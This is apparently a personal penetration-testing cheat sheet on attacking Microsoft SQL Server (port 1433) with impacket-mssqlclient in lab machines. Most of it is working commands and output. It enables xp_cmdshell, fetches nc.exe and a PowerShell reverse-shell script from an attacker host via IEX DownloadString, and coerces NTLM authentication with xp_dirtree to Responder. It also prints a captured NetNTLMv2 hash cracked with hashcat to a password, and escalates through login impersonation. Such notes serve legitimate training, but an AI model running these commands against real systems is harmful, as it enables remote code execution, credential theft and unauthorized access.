---
publish: true
created: 2026-02-25T19:23:06.793+05:30
modified: 2026-06-22T08:52:58.376+05:30
---

**Port** :1433
Tool to interact with service : impacket-mssqlclient

# enable\_xp\_cmdshell

You can run cmd commands.

```
$ impacket-mssqlclient mssql-svc:'corporate568'@10.129.9.14 -windows-auth

SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> reconfigure
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell systeminfo
```

## reverse shell

using nc

```
xp_cmdshell PowerShell.exe -Command wget http://10.10.14.107:8000/nc.exe -outfile C:\temp\nc.exe
```

using nishangs scripts.

```
EXEC xp_cmdshell 'powershell.exe -Command "IEX(New-Object System.Net.WebClient).DownloadString(''http://10.10.14.107:8000/Invoke-ConPtyShell.ps1'');"';
```

# NetNTLMv2 hash

## responder

```
$ sudo responder -I tun0
```

```
exec master.dbo.xp_dirtree '\\10.10.16.94\anyrandomstring'
```

^cdd96d

and i get the hash.

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.96.140
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:b479bcdc7aeaf414:8E80027880B39639E8F59CDB6EFB3B8E:0101000000000000009081FB7CA6DC01750E78474F58C1ED0000000002000800380047003800540001001E00570049004E002D0045003000520044004C0032005700590032003500460004003400570049004E002D0045003000520044004C003200570059003200350046002E0038004700380054002E004C004F00430041004C000300140038004700380054002E004C004F00430041004C000500140038004700380054002E004C004F00430041004C0007000800009081FB7CA6DC0106000400020000000800300030000000000000000000000000300000D8FA69B293FAF321A49DCFDA0AFAFD0816C62FC9F2AFCD45F4C1AF017EF284570A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0039003400000000000000000000000000
```

and cracking this hash.

## hashcat

```
$ hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt
[SNIP]
xNnWo6272k7x
```

# Impersonation

When you want to use a database and are blocked by security context, like below.

```
SQL (HAERO\discovery  guest@master)> enum_db;
name      is_trustworthy_on
-------   -----------------
master                    0
tempdb                    0
model                     0
msdb                      1
hrappdb                   0
SQL (HAERO\discovery  guest@master)> use hrappdb;
ERROR(DC\SQLEXPRESS): Line 1: The server principal "HAERO\discovery" is not able to access the database "hrappdb" under the current security context.
```

Try to check if you can impersonate other users on MS-SQL.

```
SQL (HAERO\discovery  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name
--------------
hrappdb-reader
```

I can impersonate _hrappdb-reader_.

```
SQL (HAERO\discovery  guest@master)> EXECUTE AS LOGIN = 'hrappdb-reader';

SQL (hrappdb-reader  guest@master)> enum_db;
name      is_trustworthy_on
-------   -----------------
master                    0
tempdb                    0
model                     0
msdb                      1
hrappdb                   0

SQL (hrappdb-reader  guest@master)> use hrappdb;
ENVCHANGE(DATABASE): Old Value: master, New Value: hrappdb
INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'hrappdb'.
```
